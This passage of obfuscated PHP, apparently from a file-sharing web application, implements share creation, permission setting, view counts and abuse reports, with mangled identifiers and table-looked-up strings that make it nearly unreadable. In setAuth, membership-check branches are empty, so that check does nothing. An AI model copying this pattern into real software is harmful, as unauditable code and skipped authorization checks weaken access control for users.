$this->shareEventAdd($®á„Òôà, $·ï¼Ôêª, $Á¡Â¥ †[1094]); return $å—£³; } protected function shareAddSystem($ªıù…ÖŞ, $ºß ›Å) { $æ€¹´ª =& $_SERVER[¥ÙÌÜ¾ê]; $îÈì = $this->_addShareData($ªıù…ÖŞ, $ºß ›Å, $æ€¹´ª[1206]); $this->_shareAuthSet($îÈì, $ºß ›Å[$æ€¹´ª[1896]]); return $îÈì; } private function shareEventAdd($­¼Ü·‹ö, $ıÍšıà, $ÊéüŠÈ = "\x61\x64\x64") { $Ù‰ß±ñ‡ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$­¼Ü·‹ö || $­¼Ü·‹ö == $Ù‰ß±ñ‡[191]) { return; } if ($ÊéüŠÈ == $Ù‰ß±ñ‡[1094]) { if ($ıÍšıà[$Ù‰ß±ñ‡[487]] == $Ù‰ß±ñ‡[87]) { Model($Ù‰ß±ñ‡[558])->eventShare($­¼Ü·‹ö, $Ù‰ß±ñ‡[1897]); } if ($ıÍšıà[$Ù‰ß±ñ‡[489]] == $Ù‰ß±ñ‡[87]) { Model($Ù‰ß±ñ‡[558])->eventShare($­¼Ü·‹ö, $Ù‰ß±ñ‡[1898]); } return; } $Ÿ¤ö§¡ˆ = $this->getInfoByPath($­¼Ü·‹ö); $Ó¿÷”£‹ = $Ù‰ß±ñ‡[1899]; if ($Ÿ¤ö§¡ˆ[$Ù‰ß±ñ‡[487]] == $Ù‰ß±ñ‡[191] && $ıÍšıà[$Ù‰ß±ñ‡[487]] == $Ù‰ß±ñ‡[87]) { $Ó¿÷”£‹ = $Ù‰ß±ñ‡[1897]; } if ($Ÿ¤ö§¡ˆ[$Ù‰ß±ñ‡[487]] == $Ù‰ß±ñ‡[87] && $ıÍšıà[$Ù‰ß±ñ‡[487]] == $Ù‰ß±ñ‡[191]) { $Ó¿÷”£‹ = $Ù‰ß±ñ‡[1900]; } if ($Ÿ¤ö§¡ˆ[$Ù‰ß±ñ‡[489]] == $Ù‰ß±ñ‡[191] && $ıÍšıà[$Ù‰ß±ñ‡[489]] == $Ù‰ß±ñ‡[87]) { $Ó¿÷”£‹ = $Ù‰ß±ñ‡[1898]; } if ($Ÿ¤ö§¡ˆ[$Ù‰ß±ñ‡[489]] == $Ù‰ß±ñ‡[87] && $ıÍšıà[$Ù‰ß±ñ‡[489]] == $Ù‰ß±ñ‡[191]) { $Ó¿÷”£‹ = $Ù‰ß±ñ‡[1901]; } Model($Ù‰ß±ñ‡[558])->eventShare($­¼Ü·‹ö, $Ó¿÷”£‹); return; } private function _addShareData($äÁÌáĞÃ, $šİäôã = array(), $ëæÓèÕª = false) { $œùù“ˆ² =& $_SERVER[¥ÙÌÜ¾ê]; $Êîì²¬ı = $ëæÓèÕª == $œùù“ˆ²[1206] ? 0 : USER_ID; $¦¸­¡üØ = array($œùù“ˆ²[412] => $äÁÌáĞÃ, $œùù“ˆ²[1572] => $Êîì²¬ı); if ($äÁÌáĞÃ == 0) { $¦¸­¡üØ = array($œùù“ˆ²[1902] => $šİäôã[$œùù“ˆ²[1106]], $œùù“ˆ²[1572] => $Êîì²¬ı); } if ($„í¢™«á = $this->where($¦¸­¡üØ)->find()) { return $„í¢™«á[$œùù“ˆ²[482]]; } if ($äÁÌáĞÃ == 0) { $œú¸ËÑ­ = array($œùù“ˆ²[28] => get_path_this($šİäôã[$œùù“ˆ²[76]])); } else { $œú¸ËÑ­ = Model($œùù“ˆ²[825])->sourceInfo($äÁÌáĞÃ); if (!$œú¸ËÑ­) { return !1; } } if (!$šİäôã[$œùù“ˆ²[1481]]) { $šİäôã[$œùù“ˆ²[1481]] = $œú¸ËÑ­[$œùù“ˆ²[28]]; } $Ç¯Ìğıè = array($œùù“ˆ²[1572] => $Êîì²¬ı, $œùù“ˆ²[412] => $äÁÌáĞÃ, $œùù“ˆ²[1481] => $œùù“ˆ²[33], $œùù“ˆ²[487] => 0, $œùù“ˆ²[489] => 0, $œùù“ˆ²[1106] => $œùù“ˆ²[33], $œùù“ˆ²[305] => $œùù“ˆ²[33], $œùù“ˆ²[888] => $œùù“ˆ²[33], $œùù“ˆ²[1903] => 0, $œùù“ˆ²[1904] => 0, $œùù“ˆ²[490] => 0, $œùù“ˆ²[491] => $œùù“ˆ²[33], $œùù“ˆ²[484] => $œùù“ˆ²[33]); $Ì›–Øöü = explode($œùù“ˆ²[47], $œùù“ˆ²[1905]); foreach ($Ì›–Øöü as $Ìô”ƒ ) { if (!isset($šİäôã[$Ìô”ƒ ])) { continue; } $Ç¯Ìğıè[$Ìô”ƒ ] = $šİäôã[$Ìô”ƒ ]; } $ ìÂò = $this->add($Ç¯Ìğıè); $ÈëòÕ¢¥ = array($œùù“ˆ²[484] => short_id($ ìÂò)); $this->where(array($œùù“ˆ²[481] => $ ìÂò))->save($ÈëòÕ¢¥); return $ ìÂò; } private function _shareAuthSet($‘º”œÖÎ, $¤§òÑÆÕ) { $Ÿ¥Â½è² =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_array($¤§òÑÆÕ)) { return !1; } $µ¯ÅØá = Model($Ÿ¥Â½è²[1856]); $µ¯ÅØá->where(array($Ÿ¥Â½è²[482] => $‘º”œÖÎ))->delete(); $²âŸ¤şö = array(); foreach ($¤§òÑÆÕ as $…¯´Ö) { $éá·ÑôÅ = SourceModel::TYPE_USER; if ($…¯´Ö[$Ÿ¥Â½è²[406]] == SourceModel::TYPE_GROUP) { $éá·ÑôÅ = SourceModel::TYPE_GROUP; } $¡ô·åØì = array($Ÿ¥Â½è²[482] => $‘º”œÖÎ, $Ÿ¥Â½è²[406] => $éá·ÑôÅ, $Ÿ¥Â½è²[498] => intval($…¯´Ö[$Ÿ¥Â½è²[498]]), $Ÿ¥Â½è²[1852] => 0, $Ÿ¥Â½è²[1906] => -1); if ($…¯´Ö[$Ÿ¥Â½è²[1852]]) { $¡ô·åØì[$Ÿ¥Â½è²[1852]] = $…¯´Ö[$Ÿ¥Â½è²[1852]]; } else { if ($…¯´Ö[$Ÿ¥Â½è²[1906]]) { $¡ô·åØì[$Ÿ¥Â½è²[1906]] = $…¯´Ö[$Ÿ¥Â½è²[1906]]; } } $²âŸ¤şö[] = $¡ô·åØì; } return $µ¯ÅØá->addAll($²âŸ¤şö, array(), !0); } public function numViewAdd($ºúÛÔäì) { $×¨·ö¹Ì =& $_SERVER[¥ÙÌÜ¾ê]; $Ö¥şÊê¿ = array($×¨·ö¹Ì[481] => $ºúÛÔäì); $this->where($Ö¥şÊê¿)->setAdd($×¨·ö¹Ì[1903]); } public function numDownloadAdd($Õößõ®) { $Éø‘Ëñ =& $_SERVER[¥ÙÌÜ¾ê]; $•àé—é¼ = array($Éø‘Ëñ[481] => $Õößõ®); $this->where($•àé—é¼)->setAdd($Éø‘Ëñ[1904]); } protected function shareEdit($°ÃÑ€Ö·, $ıÑ½ïÎÙ) { $³’©‰  =& $_SERVER[¥ÙÌÜ¾ê]; $Şşö•¤ù = $this->getInfo($°ÃÑ€Ö·); if (!$Şşö•¤ù) { return !1; } $this->_checkLinkShare($ıÑ½ïÎÙ, $Şşö•¤ù); $Ÿ«¡‘¼ = array(); $ù®‚İ = explode($³’©‰ [47], $³’©‰ [1907]); foreach ($ù®‚İ as $Ÿ»öşõ§) { if (!array_key_exists($Ÿ»öşõ§, $ıÑ½ïÎÙ)) { continue; } $Ÿ«¡‘¼[$Ÿ»öşõ§] = $ıÑ½ïÎÙ[$Ÿ»öşõ§]; } $this->shareEventAdd($Şşö•¤ù[$³’©‰ [397]], $ıÑ½ïÎÙ, $³’©‰ [1718]); $this->where(array($³’©‰ [481] => $°ÃÑ€Ö·))->save($Ÿ«¡‘¼); if (isset($ıÑ½ïÎÙ[$³’©‰ [1896]])) { $this->_shareAuthSet($°ÃÑ€Ö·, $ıÑ½ïÎÙ[$³’©‰ [1896]]); } return !0; } private function _checkLinkShare($¨ÒÈ˜²ú, $³œ«óÊ) { $Àö¡æ¶Æ =& $_SERVER[¥ÙÌÜ¾ê]; if ($¨ÒÈ˜²ú[$Àö¡æ¶Æ[487]] != $Àö¡æ¶Æ[87]) { return; } $ºÀÜáòá = $³œ«óÊ[$Àö¡æ¶Æ[85]][$Àö¡æ¶Æ[397]]; if ($³œ«óÊ[$Àö¡æ¶Æ[85]][$Àö¡æ¶Æ[29]] != $Àö¡æ¶Æ[193]) { $ò…Ÿ³¥Š = $this->_folderReport($ºÀÜáòá); if (!$ò…Ÿ³¥Š) { return; } show_json(LNG($Àö¡æ¶Æ[1908]) . $Àö¡æ¶Æ[1909] . $ò…Ÿ³¥Š, !1); } $¼ûë›ˆ = Model($Àö¡æ¶Æ[825])->fileInfoGet($³œ«óÊ[$Àö¡æ¶Æ[85]][$Àö¡æ¶Æ[397]]); if (!$¼ûë›ˆ) { return; } $ÏŠÅÀâ = $this->shareFileMeta($¼ûë›ˆ[$Àö¡æ¶Æ[461]]); if (isset($ÏŠÅÀâ[$Àö¡æ¶Æ[372]]) && $ÏŠÅÀâ[$Àö¡æ¶Æ[372]] == $Àö¡æ¶Æ[87]) { show_json(LNG($Àö¡æ¶Æ[1910]), !1); } } private function _folderReport($½§ù‹°) { $“áûÅÌï =& $_SERVER[¥ÙÌÜ¾ê]; $Ú¼ï¬™ = array($“áûÅÌï[461] => array($“áûÅÌï[1008], 0), $“áûÅÌï[743] => 3); $„†¾êÉ = Model($“áûÅÌï[1911])->where($Ú¼ï¬™)->field($“áûÅÌï[461])->select(); if (!$„†¾êÉ) { return !1; } $„†¾êÉ = array_to_keyvalue($„†¾êÉ, $“áûÅÌï[33], $“áûÅÌï[461]); $ŸãÍÖ„Š = $“áûÅÌï[47] . $½§ù‹° . $“áûÅÌï[47]; $Ú¼ï¬™ = array($“áûÅÌï[461] => array($“áûÅÌï[7], $„†¾êÉ), $“áûÅÌï[515] => array($“áûÅÌï[381], "\45{$ŸãÍÖ„Š}\45"), $“áûÅÌï[425] => 0); $³Ë­ÍœÀ = Model($“áûÅÌï[825])->where($Ú¼ï¬™)->field($“áûÅÌï[1912])->find(); if (!$³Ë­ÍœÀ) { return !1; } $á¶©èéÉ = substr($³Ë­ÍœÀ[$“áûÅÌï[515]], strpos($³Ë­ÍœÀ[$“áûÅÌï[515]], $ŸãÍÖ„Š)); $Ú¼ï¬™ = array($“áûÅÌï[397] => array($“áûÅÌï[7], trim($á¶©èéÉ, $“áûÅÌï[47]))); $Ä»ª‹ì„ = Model($“áûÅÌï[825])->where($Ú¼ï¬™)->field($“áûÅÌï[28])->select(); $€°üÇö = array_to_keyvalue($Ä»ª‹ì„, $“áûÅÌï[33], $“áûÅÌï[28]); $€°üÇö[] = $³Ë­ÍœÀ[$“áûÅÌï[28]]; return implode($“áûÅÌï[8], $€°üÇö); } protected function remove($ÒÖúÂÓŒ) { $şğ×®±é =& $_SERVER[¥ÙÌÜ¾ê]; if (is_array($ÒÖúÂÓŒ)) { $ÒÖúÂÓŒ = array($şğ×®±é[7], $ÒÖúÂÓŒ); } $èõ”ø· = array($şğ×®±é[482] => $ÒÖúÂÓŒ); $ÏÁú¦ˆÀ = $this->where($èõ”ø·)->delete(); if ($ÏÁú¦ˆÀ) { Model($şğ×®±é[590])->where(array($şğ×®±é[482] => $ÒÖúÂÓŒ))->delete(); } $¡÷Ç¹ÍÑ = is_array($ÒÖúÂÓŒ) ? $ÒÖúÂÓŒ[1] : array($ÒÖúÂÓŒ); for ($îÙ†Æ‹Â = 0; $îÙ†Æ‹Â < count($¡÷Ç¹ÍÑ); $îÙ†Æ‹Â++) { $½×ú¢ˆ¹ = $this->getInfo($¡÷Ç¹ÍÑ[$îÙ†Æ‹Â]); if ($½×ú¢ˆ¹[$şğ×®±é[489]] == $şğ×®±é[87]) { Model($şğ×®±é[558])->eventShare($½×ú¢ˆ¹[$şğ×®±é[397]], $şğ×®±é[1901]); } if ($½×ú¢ˆ¹[$şğ×®±é[487]] == $şğ×®±é[87]) { Model($şğ×®±é[558])->eventShare($½×ú¢ˆ¹[$şğ×®±é[397]], $şğ×®±é[1900]); } } return $ÏÁú¦ˆÀ; } protected function removeBySource($Ö¹ˆ³Ûº) { $Ï—â®¢¾ =& $_SERVER[¥ÙÌÜ¾ê]; $Êì’©ñ = array($Ï—â®¢¾[412] => array($Ï—â®¢¾[413], $Ö¹ˆ³Ûº)); $ıç…ããè = $this->field($Ï—â®¢¾[482])->where($Êì’©ñ)->select(); $ıç…ããè = array_to_keyvalue($ıç…ããè, $Ï—â®¢¾[33], $Ï—â®¢¾[482]); if (!$ıç…ããè) { return; } $Êì’©ñ = array($Ï—â®¢¾[481] => array($Ï—â®¢¾[413], $ıç…ããè)); $this->where($Êì’©ñ)->delete(); Model($Ï—â®¢¾[590])->where($Êì’©ñ)->delete(); } public function listAll($¦Ã–¸«³) { $ç·ÓÏ =& $_SERVER[¥ÙÌÜ¾ê]; $®‹ô€û¤ = array(); if ($¦Ã–¸«³[$ç·ÓÏ[1581]]) { $®‹ô€û¤[$ç·ÓÏ[1581]] = $¦Ã–¸«³[$ç·ÓÏ[1581]]; } if ($¦Ã–¸«³[$ç·ÓÏ[754]]) { $½ÜÓİı = $¦Ã–¸«³[$ç·ÓÏ[490]] ? $¦Ã–¸«³[$ç·ÓÏ[490]] : strtotime(date($ç·ÓÏ[1913])); $®‹ô€û¤[$ç·ÓÏ[194]] = array($ç·ÓÏ[331], array($¦Ã–¸«³[$ç·ÓÏ[754]], $½ÜÓİı)); } if ($¦Ã–¸«³[$ç·ÓÏ[29]]) { $®‹ô€û¤[$¦Ã–¸«³[$ç·ÓÏ[29]]] = 1; } else { $®‹ô€û¤[] = array($ç·ÓÏ[487] => array($ç·ÓÏ[1008], 0), $ç·ÓÏ[489] => array($ç·ÓÏ[1008], 0), $ç·ÓÏ[1890] => $ç·ÓÏ[1844]); } if ($¦Ã–¸«³[$ç·ÓÏ[1840]]) { $®‹ô€û¤[] = array($ç·ÓÏ[484] => $¦Ã–¸«³[$ç·ÓÏ[1840]], $ç·ÓÏ[1481] => array($ç·ÓÏ[381], "\45{$¦Ã–¸«³[$ç·ÓÏ[1840]]}\x25"), $ç·ÓÏ[1890] => $ç·ÓÏ[1844]); } $Óƒ¡Íß = $this->_makeOrder()->where($®‹ô€û¤)->selectPage(20); if (empty($Óƒ¡Íß[$ç·ÓÏ[367]])) { return array(); } $this->_listDataApply($Óƒ¡Íß[$ç·ÓÏ[367]]); return $Óƒ¡Íß; } public function listDataApply($ùéó¥ş) { $this->_listDataApply($ùéó¥ş); return $ùéó¥ş; } private function _listDataApply(&$Åğèšéú) { $ğú¦†ºè =& $_SERVER[¥ÙÌÜ¾ê]; $ôäåû’® = array_to_keyvalue($Åğèšéú, $ğú¦†ºè[33], $ğú¦†ºè[1581]); $Û½•Î = Model($ğú¦†ºè[532])->userListInfo(array_unique($ôäåû’®)); $ª¨ç³ğğ = array_to_keyvalue($Åğèšéú, $ğú¦†ºè[33], $ğú¦†ºè[397]); $ùÕ²¹­ç = Model($ğú¦†ºè[825])->sourceListInfo($ª¨ç³ğğ, !0); foreach ($Åğèšéú as $ªÔÁ ş› => &$±ü™üà„) { $´úï™² = $±ü™üà„[$ğú¦†ºè[1581]]; $±ü™üà„[$ğú¦†ºè[1914]] = $Û½•Î[$´úï™²] ? $Û½•Î[$´úï™²] : !1; $ä©ø€Ó‚ = $±ü™üà„[$ğú¦†ºè[397]]; $±ü™üà„[$ğú¦†ºè[85]] = $ùÕ²¹­ç[$ä©ø€Ó‚] ? $ùÕ²¹­ç[$ä©ø€Ó‚] : !1; if ($±ü™üà„[$ğú¦†ºè[85]][$ğú¦†ºè[425]] == $ğú¦†ºè[87]) { unset($Åğèšéú[$ªÔÁ ş›]); } if ($±ü™üà„[$ğú¦†ºè[85]] != $ğú¦†ºè[191] && !$±ü™üà„[$ğú¦†ºè[85]]) { unset($Åğèšéú[$ªÔÁ ş›]); } } unset($±ü™üà„); $Åğèšéú = array_values($Åğèšéú); } private function _makeOrder($ƒÉúğú = '') { $††ô•Ÿ =& $_SERVER[¥ÙÌÜ¾ê]; $¤¾ã¨¢† = array($††ô•Ÿ[194], $††ô•Ÿ[490], $††ô•Ÿ[1903], $††ô•Ÿ[1904]); $ù’Ú€Ÿü = array($††ô•Ÿ[442] => $††ô•Ÿ[443], $††ô•Ÿ[444] => $††ô•Ÿ[445]); $Òà‚æÔÄ = Input::get($††ô•Ÿ[449], $††ô•Ÿ[7], $††ô•Ÿ[418], $¤¾ã¨¢†); $Úå¸İ»ê = Input::get($††ô•Ÿ[450], $††ô•Ÿ[7], $††ô•Ÿ[1915], array($††ô•Ÿ[1839], $††ô•Ÿ[444])); $Úå¸İ»ê = $ù’Ú€Ÿü[$Úå¸İ»ê]; $ƒÉúğú = $ƒÉúğú . "{$Òà‚æÔÄ}\40{$Úå¸İ»ê}"; return $this->order($ƒÉúğú); } public function reportAdd($ÖÆ‚Î³) { $¿•©±´© =& $_SERVER[¥ÙÌÜ¾ê]; $³“ˆ¸á¶ = array($¿•©±´©[482] => $ÖÆ‚Î³[$¿•©±´©[482]], $¿•©±´©[1581] => USER_ID); if (Model($¿•©±´©[1911])->where($³“ˆ¸á¶)->find()) { return !1; } $µÂ¾ÎÀ¡ = array($¿•©±´©[482] => $ÖÆ‚Î³[$¿•©±´©[482]], $¿•©±´©[1481] => $ÖÆ‚Î³[$¿•©±´©[1481]], $¿•©±´©[397] => $ÖÆ‚Î³[$¿•©±´©[397]], $¿•©±´©[461] => $ÖÆ‚Î³[$¿•©±´©[461]], $¿•©±´©[1581] => USER_ID, $¿•©±´©[29] => $ÖÆ‚Î³[$¿•©±´©[29]], $¿•©±´©[445] => $ÖÆ‚Î³[$¿•©±´©[445]]); return Model($¿•©±´©[1911])->add($µÂ¾ÎÀ¡); } public function reportList($ÇÎ÷£·µ) { $ †şËØ =& $_SERVER[¥ÙÌÜ¾ê]; $£áŒÛŠ = array(); if ($ÇÎ÷£·µ[$ †şËØ[754]]) { $Ö–‡¦¡‰ = $ÇÎ÷£·µ[$ †şËØ[490]] ? $ÇÎ÷£·µ[$ †şËØ[490]] : strtotime(date($ †şËØ[1913])); $£áŒÛŠ[$ †şËØ[194]] = array($ †şËØ[331], array($ÇÎ÷£·µ[$ †şËØ[754]], $Ö–‡¦¡‰)); } if (isset($ÇÎ÷£·µ[$ †şËØ[29]]) && in_array($ÇÎ÷£·µ[$ †şËØ[29]], array($ †şËØ[87], $ †şËØ[429], $ †şËØ[1916], $ †şËØ[1917], $ †şËØ[1918]))) { $£áŒÛŠ[$ †şËØ[29]] = $ÇÎ÷£·µ[$ †şËØ[29]]; } if (isset($ÇÎ÷£·µ[$ †şËØ[743]]) && in_array($ÇÎ÷£·µ[$ †şËØ[743]], array($ †şËØ[191], $ †şËØ[87], $ †şËØ[429], $ †şËØ[1916]))) { $£áŒÛŠ[$ †şËØ[743]] = $ÇÎ÷£·µ[$ †şËØ[743]]; } $‘¥ÅÇ¥Ğ = Input::get($ †şËØ[450], $ †şËØ[7], $ †şËØ[1915], array($ †şËØ[1839], $ †şËØ[444])); $Ê¡ºø«Š = array($ †şËØ[442] => $ †şËØ[443], $ †şËØ[444] => $ †şËØ[445]); $’×ĞÆòÚ = $ †şËØ[1919] . $Ê¡ºø«Š[$‘¥ÅÇ¥Ğ]; $ãåÜ—ë = Model($ †şËØ[1911])->where($£áŒÛŠ)->order($’×ĞÆòÚ)->selectPage(20); if (empty($ãåÜ—ë[$ †şËØ[367]])) { return array(); } $Ù¾ıó“ = array_to_keyvalue_group($ãåÜ—ë[$ †şËØ[367]], $ †şËØ[743], $ †şËØ[482]); if (!empty($Ù¾ıó“[0])) { $ÇÎ÷£·µ = $Ù¾ıó“[0]; $£áŒÛŠ = array($ †şËØ[482] => array($ †şËØ[7], $ÇÎ÷£·µ)); $’ôÃŠÚÃ = $this->where($£áŒÛŠ)->field($ †şËØ[482])->select(); $’ôÃŠÚÃ = array_to_keyvalue($’ôÃŠÚÃ, $ †şËØ[33], $ †şËØ[482]); $ã˜¾É’¤ = array_diff($ÇÎ÷£·µ, $’ôÃŠÚÃ); if (!empty($ã˜¾É’¤)) { foreach ($ãåÜ—ë[$ †şËØ[367]] as $ìÔ“½á· => $ç¦©çÕ) { if (in_array($ç¦©çÕ[$ †şËØ[482]], $ã˜¾É’¤)) { unset($ãåÜ—ë[$ †şËØ[367]][$ìÔ“½á·]); } } } } $this->_listDataApply($ãåÜ—ë[$ †şËØ[367]]); return $ãåÜ—ë; } public function reportStatus($š˜Ü¥¾Ş) { $„şŞû¸ =& $_SERVER[¥ÙÌÜ¾ê]; $–úÛ¨¶ = array($„şŞû¸[395] => $š˜Ü¥¾Ş[$„şŞû¸[395]]); $Ö¡Îí‹Š = Model($„şŞû¸[1911])->where($–úÛ¨¶)->field($„şŞû¸[1920])->find(); if (!$Ö¡Îí‹Š) { return !1; } $ŸíüÖûÓ = array($„şŞû¸[743] => $š˜Ü¥¾Ş[$„şŞû¸[743]]); if ($š˜Ü¥¾Ş[$„şŞû¸[743]] == $„şŞû¸[1916] && $Ö¡Îí‹Š[$„şŞû¸[743]] == $„şŞû¸[1916]) { $ŸíüÖûÓ[$„şŞû¸[743]] = 0; } $ÊÑ¤üç¡ = Model($„şŞû¸[1911])->where($–úÛ¨¶)->save($ŸíüÖûÓ); if ($š˜Ü¥¾Ş[$„şŞû¸[743]] == $„şŞû¸[429]) { if ($Ö¡Îí‹Š[$„şŞû¸[461]] != $„şŞû¸[191] && $this->shareFileMeta($Ö¡Îí‹Š[$„şŞû¸[461]])) { $this->shareFileMeta($Ö¡Îí‹Š[$„şŞû¸[461]], 0); } $this->remove($Ö¡Îí‹Š[$„şŞû¸[482]]); return !0; } if ($ÊÑ¤üç¡ && $š˜Ü¥¾Ş[$„şŞû¸[743]] == $„şŞû¸[1916]) { $ñÚãÎã­ = $ŸíüÖûÓ[$„şŞû¸[743]] == $„şŞû¸[1916] ? 1 : 0; $this->shareFileMeta($Ö¡Îí‹Š[$„şŞû¸[461]], $ñÚãÎã­); $this->removeByFile($Ö¡Îí‹Š[$„şŞû¸[461]]); } return $ÊÑ¤üç¡; } private function removeByFile($Ü¥¬…ì) { $Òáì‚üÍ =& $_SERVER[¥ÙÌÜ¾ê]; $²¬Ô²¬ = Model($Òáì‚üÍ[825])->where(array($Òáì‚üÍ[461] => $Ü¥¬…ì))->field($Òáì‚üÍ[397])->select(); $ŠÆØ”™¹ = array_to_keyvalue($²¬Ô²¬, $Òáì‚üÍ[33], $Òáì‚üÍ[397]); $ä¦µ°ä  = array($Òáì‚üÍ[397] => array($Òáì‚üÍ[7], $ŠÆØ”™¹), $Òáì‚üÍ[487] => 1); $²¬Ô²¬ = $this->where($ä¦µ°ä )->field($Òáì‚üÍ[482])->select(); if (empty($²¬Ô²¬)) { return; } $—ğÊ„Áä = array_to_keyvalue($²¬Ô²¬, $Òáì‚üÍ[33], $Òáì‚üÍ[482]); $this->remove($—ğÊ„Áä); } private function shareFileMeta($úÃÍä˜¼, $£ƒÊ‹Ù¶ = null) { $‡Œšª =& $_SERVER[¥ÙÌÜ¾ê]; $‚üåàË§ = array($‡Œšª[461] => $úÃÍä˜¼, $‡Œšª[93] => $‡Œšª[1921]); if (is_null($£ƒÊ‹Ù¶)) { return Model($‡Œšª[1922])->where($‚üåàË§)->find(); } $‚üåàË§[$‡Œšª[372]] = $£ƒÊ‹Ù¶; Model($‡Œšª[1922])->add($‚üåàË§, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\x63\145\137\x61\x75\164\150"; public function getAuth($¡—¡ùÎé) { $Èë‰ı˜† =& $_SERVER[¥ÙÌÜ¾ê]; $ªµÁî‘Ó = $this->sourceAuthSelect($¡—¡ùÎé); $ŠèùŠ¶ = array(); $¥Ëâ¢ ã = array(); $‘´ôÅÔœ = 2 << 25; foreach ($ªµÁî‘Ó as $œË”°òë) { $¨‹½ô³ë = Model($Èë‰ı˜†[501])->listData($œË”°òë[$Èë‰ı˜†[1852]]); if (!$¨‹½ô³ë) { continue; } $ŠèùŠ¶[] = $œË”°òë; $óÊ¾øëÍ = 0; if ($œË”°òë[$Èë‰ı˜†[406]] == SourceModel::TYPE_GROUP) { $óÊ¾øëÍ = $‘´ôÅÔœ * 2; } if ($œË”°òë[$Èë‰ı˜†[406]] == SourceModel::TYPE_USER) { $óÊ¾øëÍ = $‘´ôÅÔœ; } if ($œË”°òë[$Èë‰ı˜†[406]] == SourceModel::TYPE_USER && $œË”°òë[$Èë‰ı˜†[498]] == $Èë‰ı˜†[191]) { $óÊ¾øëÍ = 0; } $¥Ëâ¢ ã[] = $¨‹½ô³ë[$Èë‰ı˜†[408]] + $óÊ¾øëÍ; } array_multisort($¥Ëâ¢ ã, SORT_DESC, $ŠèùŠ¶); return $ŠèùŠ¶; } public function sourceAuthSelect($—ÚÓè›•) { $™ÕêšÛ =& $_SERVER[¥ÙÌÜ¾ê]; static $Ìˆ©–’ï = array(); $ŞÒöÅ‰° = is_array($—ÚÓè›•) ? !1 : !0; if ($ŞÒöÅ‰°) { $—ÚÓè›• = array($—ÚÓè›•); } $ËœÀËƒ¹ = array(); foreach ($—ÚÓè›• as $ˆ‰òÇÕı) { if (isset($Ìˆ©–’ï[$ˆ‰òÇÕı])) { $ËœÀËƒ¹[$ˆ‰òÇÕı] = $Ìˆ©–’ï[$ˆ‰òÇÕı]; } } if (count($ËœÀËƒ¹) == count($—ÚÓè›•)) { return $ŞÒöÅ‰° ? $ËœÀËƒ¹[$—ÚÓè›•[0]] : $ËœÀËƒ¹; } $Ê²ÄşŞÓ = $™ÕêšÛ[1923]; $×ŠóÃˆ = array($™ÕêšÛ[397] => array($™ÕêšÛ[7], $—ÚÓè›•)); $ßõèßŠ¦ = $this->field($Ê²ÄşŞÓ)->order($™ÕêšÛ[395])->where($×ŠóÃˆ)->select(); $õ‡–íÓ = array_to_keyvalue_group($ßõèßŠ¦, $™ÕêšÛ[397]); foreach ($—ÚÓè›• as $ˆ‰òÇÕı) { $Ìˆ©–’ï[$ˆ‰òÇÕı] = $õ‡–íÓ[$ˆ‰òÇÕı] ? $õ‡–íÓ[$ˆ‰òÇÕı] : array(); } if ($ŞÒöÅ‰°) { return $ßõèßŠ¦; } return $õ‡–íÓ; } public function setAuth($µ©Şª¼¬, $Ò»ñÙÓ) { $ÖÔ¸§Ä =& $_SERVER[¥ÙÌÜ¾ê]; $ûòèìÉ¯ = Model($ÖÔ¸§Ä[1253])->sourceInfo($µ©Şª¼¬); if (!$ûòèìÉ¯) { return !1; } if ($ûòèìÉ¯[$ÖÔ¸§Ä[406]] != SourceModel::TYPE_GROUP) { return !1; } $éŞ¯õŒÀ = 1; $îÆò°‹Ğ = $ûòèìÉ¯[$ÖÔ¸§Ä[498]]; if ($îÆò°‹Ğ != $éŞ¯õŒÀ) { $Ğß­ÊŸ° = array($ÖÔ¸§Ä[1749] => $îÆò°‹Ğ); $è¯„¼ïÓ = Model($ÖÔ¸§Ä[1838])->field($ÖÔ¸§Ä[1581])->where($Ğß­ÊŸ°)->select(); $è¯„¼ïÓ = array_to_keyvalue($è¯„¼ïÓ, $ÖÔ¸§Ä[33], $ÖÔ¸§Ä[1581]); } $ÂÏ¸·ˆ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $®ÀÜÕØ¼ = array(); foreach ($Ò»ñÙÓ as $¯Ì¾¥€£) { if (!in_array($¯Ì¾¥€£[$ÖÔ¸§Ä[406]], $ÂÏ¸·ˆ)) { show_json(LNG($ÖÔ¸§Ä[1924]), !1); } if ($îÆò°‹Ğ != $éŞ¯õŒÀ) { if ($¯Ì¾¥€£[$ÖÔ¸§Ä[406]] == SourceModel::TYPE_GROUP) { } if ($¯Ì¾¥€£[$ÖÔ¸§Ä[498]] != 0 && !in_array($¯Ì¾¥€£[$ÖÔ¸§Ä[498]], $è¯„¼ïÓ)) { } } if ($¯Ì¾¥€£[$ÖÔ¸§Ä[498]] == 0) { $¯Ì¾¥€£[$ÖÔ¸§Ä[406]] = SourceModel::TYPE_USER; } $®ÀÜÕØ¼[] = array($ÖÔ¸§Ä[397] => $µ©Şª¼¬, $ÖÔ¸§Ä[406] => intval($¯Ì¾¥€£[$ÖÔ¸§Ä[406]]), $ÖÔ¸§Ä[498] => intval($¯Ì¾¥€£[$ÖÔ¸§Ä[498]]), $ÖÔ¸§Ä[1852] => intval($¯Ì¾¥€£[$ÖÔ¸§Ä[1852]]) ? intval($¯Ì¾¥€£[$ÖÔ¸§Ä[1852]]) : 0, $ÖÔ¸§Ä[1906] => intval($¯Ì¾¥€£[$ÖÔ¸§Ä[1906]]) ? intval($¯Ì¾¥€£[$ÖÔ¸§Ä[1906]]) : -1); } $this->where(array($ÖÔ¸§Ä[412] => $µ©Şª¼¬))->delete(); $this->addAll($®ÀÜÕØ¼); return !0; } public function authClear($Ä¿”Î) { $ñë¦àÁÑ =& $_SERVER[¥ÙÌÜ¾ê]; $¸ìñª = Model($ñë¦àÁÑ[1253])->sourceInfo($Ä¿”Î); $ÈÚĞ•ª± = array($Ä¿”Î); if ($¸ìñª[$ñë¦àÁÑ[405]] == $ñë¦àÁÑ[87]) { $²Ğ‰‚Ş€ = array($ñë¦àÁÑ[578] => array($ñë¦àÁÑ[538], $¸ìñª[$ñë¦àÁÑ[515]] . $Ä¿”Î . $ñë¦àÁÑ[539])); $ÈÚĞ•ª± = Model($ñë¦àÁÑ[1253])->field($ñë¦àÁÑ[412])->where($²Ğ‰‚Ş€)->getField($ñë¦àÁÑ[397], !0); $ÈÚĞ•ª±[] = $Ä¿”Î; } $this->where(array($ñë¦àÁÑ[412] => array($ñë¦àÁÑ[413], 